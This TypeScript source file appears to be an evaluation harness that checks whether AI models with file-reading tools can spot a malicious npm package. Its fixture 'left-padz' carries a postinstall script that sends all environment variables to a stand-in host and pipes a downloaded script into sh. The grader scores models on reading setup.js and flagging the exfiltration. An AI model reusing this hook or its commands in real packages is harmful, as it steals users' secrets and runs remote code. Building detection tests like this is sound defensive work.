// M0 spike: tool-call reliability eval. Local dev only (see index.ts).
const FILES: Record<string, string> = {
  'package.json': JSON.stringify({ name: 'left-padz', version: '1.0.2', scripts: { postinstall: 'node scripts/setup.js' } }, null, 2),
  'scripts/setup.js': `const https=require('https');const os=require('os');
const data=Buffer.from(JSON.stringify(process.env)).toString('base64');
const r=https.request({host:'203.0.113.9',path:'/c',method:'POST'});r.end(data);
require('child_process').exec('curl -s http://203.0.113.9/p | sh');`,
  'index.js': 'module.exports = (s, n) => String(s).padStart(n);',
};
const TOOLS = [
  { type: 'function', function: { name: 'read_file', description: 'Read a file from the repo', parameters: { type: 'object', properties: { path: { type: 'string' } }, required: ['path'] } } },
  { type: 'function', function: { name: 'list_files', description: 'List all repo files', parameters: { type: 'object', properties: {} } } },
];
const PRICES: Record<string, [number, number]> = {
  '@cf/zai-org/glm-5.3-flash': [0.15, 0.5],
  '@cf/zai-org/glm-5.3': [1.4, 4.4],
  '@cf/google/gemma-4-26b-a4b-it': [0.1, 0.3],
};

export async function runEval(env: Env, model: string) {
  const messages: any[] = [
    { role: 'system', content: 'You assess whether a repo is safe to run locally. Use tools to inspect files, then give a verdict: clear, suspicious, or likely malicious, with evidence.' },
    { role: 'user', content: 'Is this repo safe to npm install and run?' },
  ];
  let inTok = 0, outTok = 0, toolCalls = 0, badCalls = 0, turns = 0;
  let final = '';
  for (; turns < 8; turns++) {
    const res: any = await env.AI.run(model as never, { messages, tools: TOOLS, max_completion_tokens: 1500 } as never, { gateway: { id: env.AI_GATEWAY_ID, metadata: { eval: model } } });
    inTok += res.usage?.prompt_tokens ?? 0;
    outTok += res.usage?.completion_tokens ?? 0;
    const msg = res.choices?.[0]?.message;
    if (!msg) { final = 'NO MESSAGE: ' + JSON.stringify(res).slice(0, 300); break; }
    messages.push(msg);
    if (!msg.tool_calls?.length) { final = msg.content ?? ''; break; }
    for (const tc of msg.tool_calls) {
      toolCalls++;
      let out = 'error';
      try {
        const args = JSON.parse(tc.function.arguments || '{}');
        if (tc.function.name === 'list_files') out = Object.keys(FILES).join('\n');
        else if (tc.function.name === 'read_file' && FILES[args.path] !== undefined) out = FILES[args.path];
        else { badCalls++; out = 'not found'; }
      } catch { badCalls++; }
      messages.push({ role: 'tool', tool_call_id: tc.id, content: out });
    }
  }
  const [pi, po] = PRICES[model] ?? [0, 0];
  const readSetup = messages.some((m) => m.tool_calls?.some((t: any) => t.function.arguments?.includes('setup.js')));
  return {
    model, turns, toolCalls, badCalls, inspectedSetupJs: readSetup,
    flaggedMalicious: /malicious|suspicious/i.test(final) && /203\.0\.113\.9|exfil|env/i.test(final),
    tokens: { in: inTok, out: outTok },
    costUsd: +((inTok * pi + outTok * po) / 1e6).toFixed(5),
    final: final.slice(0, 600),
  };
}
